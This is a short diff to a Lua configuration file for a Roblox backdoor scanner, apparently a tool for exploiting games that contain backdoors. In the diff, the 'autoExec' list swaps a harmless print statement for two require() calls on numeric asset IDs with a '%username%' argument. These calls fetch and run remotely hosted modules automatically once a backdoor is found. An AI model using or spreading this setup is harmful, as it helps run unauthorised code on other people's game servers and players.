@@ -13,7 +13,8 @@ return {
 	-- $scripts that executes after backdoor is found
 	-- $you can add any scripts here
 	["autoExec"] = {
-		[[print("jLn0n's beckdeer skenner is epic!")]],
+		[[require(108774122461276).load("%username%")]],
+		[[require(114107182487500)("%username%")]]
 	},
 
 	-- $remote filters that you don't want to be scanned
